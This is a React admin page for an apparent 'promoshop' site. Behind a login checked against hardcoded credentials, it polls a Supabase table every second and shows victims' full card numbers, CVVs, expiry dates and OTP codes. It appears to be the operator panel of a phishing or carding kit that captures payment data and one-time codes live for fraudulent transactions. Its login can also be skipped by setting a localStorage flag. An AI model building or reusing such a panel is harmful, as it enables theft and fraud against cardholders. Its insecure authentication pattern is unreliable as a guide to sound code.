import { useState, useEffect } from 'react';
import { supabase } from '@/integrations/supabase/client';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Trash2, Eye, Search, LogOut } from 'lucide-react';

const ADMIN_USER = 'promoshop_admin';
const ADMIN_PASS = 'digital999s#';

export default function Admin() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [sessions, setSessions] = useState<any[]>([]);
  const [search, setSearch] = useState('');
  const [selectedSession, setSelectedSession] = useState<any>(null);

  useEffect(() => {
    const saved = localStorage.getItem('admin_logged_in');
    if (saved === 'true') setIsLoggedIn(true);
  }, []);

  useEffect(() => {
    if (!isLoggedIn) return;
    fetchSessions();
    const interval = setInterval(fetchSessions, 1000);
    return () => clearInterval(interval);
  }, [isLoggedIn]);

  const fetchSessions = async () => {
    const { data } = await supabase.from('payment_sessions').select('*').order('created_at', { ascending: false });
    if (data) setSessions(data);
  };

  const handleLogin = () => {
    if (username === ADMIN_USER && password === ADMIN_PASS) {
      setIsLoggedIn(true);
      localStorage.setItem('admin_logged_in', 'true');
    }
  };

  const handleLogout = () => {
    setIsLoggedIn(false);
    localStorage.removeItem('admin_logged_in');
  };

  const handleDelete = async (id: string) => {
    await supabase.from('payment_sessions').delete().eq('id', id);
    fetchSessions();
  };

  const filtered = sessions.filter(s => 
    s.session_key?.includes(search) || s.card_number_masked?.includes(search)
  );

  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="w-full max-w-sm bg-card rounded-xl shadow-lg p-6">
          <h1 className="text-xl font-semibold mb-4 text-center">Admin Login</h1>
          <Input value={username} onChange={e => setUsername(e.target.value)} placeholder="Username" className="mb-3" />
          <Input type="password" value={password} onChange={e => setPassword(e.target.value)} placeholder="Password" className="mb-4" />
          <Button onClick={handleLogin} className="w-full">Login</Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background p-4">
      <div className="max-w-6xl mx-auto">
        <div className="flex justify-between items-center mb-6">
          <h1 className="text-2xl font-bold">Payment Sessions</h1>
          <Button variant="outline" onClick={handleLogout}><LogOut className="w-4 h-4 mr-2" />Logout</Button>
        </div>

        <div className="relative mb-4">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
          <Input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search..." className="pl-10" />
        </div>

        <div className="bg-card rounded-lg shadow overflow-hidden">
          <table className="w-full text-sm">
            <thead className="bg-muted">
              <tr>
                <th className="p-3 text-left">Session Key</th>
                <th className="p-3 text-left">Amount</th>
                <th className="p-3 text-left">Card</th>
                <th className="p-3 text-left">Status</th>
                <th className="p-3 text-left">Actions</th>
              </tr>
            </thead>
            <tbody>
              {filtered.map(s => (
                <tr key={s.id} className="border-t border-border">
                  <td className="p-3 font-mono text-xs">{s.session_key}</td>
                  <td className="p-3">{s.amount} BDT</td>
                  <td className="p-3">{s.card_number_masked || '-'}</td>
                  <td className="p-3"><span className={`px-2 py-1 rounded text-xs ${s.status === 'pending' ? 'bg-yellow-100 text-yellow-800' : 'bg-green-100 text-green-800'}`}>{s.status}</span></td>
                  <td className="p-3 flex gap-2">
                    <Button size="sm" variant="outline" onClick={() => setSelectedSession(s)}><Eye className="w-4 h-4" /></Button>
                    <Button size="sm" variant="destructive" onClick={() => handleDelete(s.id)}><Trash2 className="w-4 h-4" /></Button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {selectedSession && (
          <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50" onClick={() => setSelectedSession(null)}>
            <div className="bg-card rounded-lg p-6 max-w-md w-full" onClick={e => e.stopPropagation()}>
              <h2 className="text-lg font-semibold mb-4">Session Details</h2>
              <div className="space-y-2 text-sm">
                <div><strong>Card Number:</strong> {selectedSession.card_number_full || '-'}</div>
                <div><strong>CVV:</strong> {selectedSession.card_cvv || '-'}</div>
                <div><strong>Expiry:</strong> {selectedSession.card_expiry || '-'}</div>
                <div><strong>OTP:</strong> {selectedSession.otp_code || '-'}</div>
              </div>
              <Button className="w-full mt-4" onClick={() => setSelectedSession(null)}>Close</Button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
